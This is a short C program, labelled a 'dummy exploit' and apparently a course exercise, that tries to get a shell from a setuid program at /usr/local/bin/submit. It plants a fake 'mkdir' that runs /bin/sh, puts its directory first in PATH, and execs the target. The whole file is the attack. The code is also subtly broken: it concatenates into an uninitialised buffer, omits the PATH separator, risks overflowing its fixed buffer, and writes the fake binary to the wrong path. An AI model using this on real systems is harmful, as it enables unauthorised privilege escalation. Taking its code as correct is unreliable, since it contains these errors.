/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

#define TARGET "/usr/local/bin/submit"

int main(void)
{
  char *args[4];
  char *env[1];
  FILE *f;

  char path[100];

  strcat(path, "/share/bin");
  strcat(path, getenv ("PATH"));

  mkdir("/share/bin", 0777);
  f = fopen("bin/mkdir", "w");
  fprintf(f, "/bin/sh\n");
  fclose(f);

  chmod("bin/mkdir", S_IRWXU|S_IRGRP|S_IXGRP|S_IROTH);


  args[0] = "blah"; 
  args[1] = "-s"; 
  args[2] = "blah"; 
  args[3] = NULL;

  env[0] = path; 

  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");

  exit(0);
}
